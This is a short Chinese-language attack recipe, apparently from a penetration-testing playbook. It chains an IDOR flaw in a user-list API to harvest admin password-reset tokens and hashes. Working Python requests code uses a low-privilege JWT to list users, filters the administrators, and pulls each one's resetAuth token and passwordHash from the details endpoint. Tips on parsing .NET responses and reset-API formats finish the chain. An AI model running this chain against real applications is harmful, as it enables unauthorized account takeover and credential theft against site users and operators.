## 补充：用户列表 IDOR → 密码重置 Token 收割链（2026-09-16）

### 触发条件
- 低权限 JWT 可访问 `GetUserList` 或 `GetUserDetails`
- 用户详情中含有 `resetAuth` / `passwordResetToken` / `resetToken`

### 步骤
```python
# 1. 低权 JWT 获取全量用户列表（含 roleId）
users = requests.get(BASE + "api/User/GetUserList",
    headers={"Authorization": f"Bearer {LOW_JWT}"}).json()

# 2. 筛选管理员
admins = [u for u in users if int(u.get('roleId', 0)) <= -1]

# 3. 逐个获取详情（resetAuth 只在详情接口里！）
for admin in admins:
    detail = requests.get(BASE + f"api/User/GetUserDetails?userId={admin['userId']}",
        headers={"Authorization": f"Bearer {LOW_JWT}"}).json()
    reset_token = detail.get('resetAuth') or detail.get('resetAuthKey')
    pw_hash = detail.get('passwordHash')
    print(f"{detail.get('email')} | reset={reset_token} | hash={pw_hash}")

# 4. 有 resetAuth → 直接密码重置（见 react-spa-tempuser-idor-otp-chain）
```

### 关键提醒
- 列表接口 ≠ 详情接口（敏感字段往往只在详情里）
- `.NET Core` 的响应用 `json.loads(r.content.decode('utf-8-sig'))` 解析
- 密码重置 API 可能需要 `FormData` 而非 `JSON body`（读 JS bundle 确认）

